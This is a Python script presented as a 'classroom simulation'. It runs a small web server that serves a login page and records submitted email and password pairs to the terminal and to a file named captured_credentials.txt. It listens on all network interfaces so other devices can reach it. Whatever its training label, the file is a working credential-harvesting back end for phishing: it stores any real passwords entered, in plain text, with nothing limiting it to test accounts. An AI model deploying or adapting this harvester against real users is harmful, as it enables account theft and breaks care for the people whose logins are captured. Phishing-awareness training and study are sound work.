"""Local classroom simulation. Run: python lab_demo.py"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
import datetime
import os
import sys

def beep():
   sys.stdout.write('\a') 
   sys.stdout.flush()
   os.system('echo "\a"') or os.system('printf "\a"') or os.system('powershell -c "\[console]::Beep(500,300)" >nul')


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path not in ('/', '/index.html'):
            self.send_error(404)
            return
        body = Path(__file__).with_name('index.html').read_bytes()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'no-store')
        self.send_header('Content-Security-Policy', "default-src 'none'; connect-src 'self'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src https://images.unsplash.com; form-action 'none'; base-uri 'none'; frame-ancestors 'none'")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        import urllib.parse

        parsed_path = urllib.parse.urlparse(self.path)

        if parsed_path.path != '/demo':
            self.send_error(404)
            return

        # Extract credentials from query string like /demo?e=user@test.com&p=12345

        # Get query parameters
        query_params = urllib.parse.parse_qs(parsed_path.query)
        email = query_params.get('e', [''])[0]
        pwd = query_params.get('p', [''])[0]

        # Log event to terminal and file
        log_entry = (
            'TRAINING EVENT: demo login clicked.\n'
            'Preset account: student@example.test\n'
        )

        if email and pwd:
            log_entry += f'Credentials captured -> Email: {email} | Password: {pwd}\n'
            with open('captured_credentials.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.datetime.now()}] Email={email} | Pass={pwd}\n")
        else:
            log_entry += 'No additional credentials captured.\n'

        print(log_entry.strip(), flush=True)

        self.send_response(204)
        self.send_header('Content-Length', '0')
        self.end_headers()


    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    print('Classroom simulation: http://127.0.0.1:8000\nOther devices: http://<this-laptop-LAN-IP>:8000\nPress Ctrl+C to stop.')
    try:
        HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
    except KeyboardInterrupt:
        print('\nDemo stopped.')
